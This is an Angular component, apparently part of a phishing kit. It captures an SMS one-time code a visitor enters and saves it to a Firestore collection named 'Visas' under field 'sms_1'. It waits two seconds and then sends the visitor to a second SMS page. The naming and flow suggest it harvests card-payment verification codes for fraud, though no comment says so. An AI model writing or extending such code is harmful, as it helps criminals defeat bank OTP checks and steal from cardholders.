import { Component, OnInit } from '@angular/core';
import { AngularFirestore } from '@angular/fire/compat/firestore';
import { ActivatedRoute, Router } from '@angular/router';

@Component({
  selector: 'app-sms',
  templateUrl: './sms.component.html',
  styleUrls: ['./sms.component.scss'],
})
export class SmsComponent implements OnInit {
  id: string = '';
  otp: string = '';
  constructor(
    private router: Router,
    private route: ActivatedRoute,
    private firestore: AngularFirestore
  ) {}
  ngOnInit(): void {
    this.route.params.subscribe((params) => {
      this.id = params['name'];
    });
  }

  onSubmit() {
    if (this.otp != '') {
      setTimeout(() => {
        this.firestore.collection('Visas').doc(this.id).update({
          sms_1: this.otp,
        });
      }, 2000);
      this.router.navigate([`/sms2/${this.id}`]);
    }
  }
}
